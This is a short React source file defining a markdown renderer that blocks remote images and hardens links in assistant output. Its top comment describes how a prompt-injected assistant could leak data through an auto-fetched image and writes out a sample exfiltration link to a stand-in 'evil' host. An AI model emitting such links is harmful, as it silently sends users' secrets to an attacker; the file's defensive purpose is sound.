import ReactMarkdown, { type Components } from 'react-markdown';
import remarkGfm from 'remark-gfm';
import rehypeHighlight from 'rehype-highlight';

// Assistant output is untrusted (prompt injection can steer it). A markdown image is fetched by the
// browser with no click, so ![](https://evil/?d=<secret>) would exfiltrate data silently. Never render
// remote images: show the alt text instead. Links open without an opener or referrer.
const components: Components = {
  img: ({ alt }) => (
    <span className="text-muted-soft" title="Remote images are not loaded">
      [image{alt ? `: ${alt}` : ''}]
    </span>
  ),
  a: ({ href, children }) => (
    <a href={href} target="_blank" rel="noopener noreferrer">
      {children}
    </a>
  ),
};

export function SafeMarkdown({ text }: { text: string }) {
  return (
    <ReactMarkdown remarkPlugins={[remarkGfm]} rehypePlugins={[rehypeHighlight]} components={components}>
      {text}
    </ReactMarkdown>
  );
}
